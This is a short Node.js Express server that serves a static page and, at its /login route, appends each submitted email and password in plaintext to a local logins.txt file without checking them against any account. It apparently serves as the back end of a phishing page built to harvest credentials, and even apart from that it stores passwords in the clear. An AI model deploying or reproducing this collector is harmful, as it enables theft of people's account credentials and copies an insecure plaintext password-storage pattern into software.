const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3001;

// Parse JSON data
app.use(bodyParser.json());

// Serve static files from /public
app.use(express.static(path.join(__dirname, "public")));

// Serve index.html for root
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Handle POST login
app.post("/login", (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ message: "Missing fields" });
  }

  const entry = `Email: ${email}, Password: ${password}\n`;

  fs.appendFile(path.join(__dirname, "logins.txt"), entry, (err) => {
    if (err) {
      console.error("❌ Failed to save login:", err);
      return res.status(500).json({ message: "Server error" });
    }
    console.log("✅ Login saved:", email);
    res.status(200).json({ message: "Saved" });
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
});
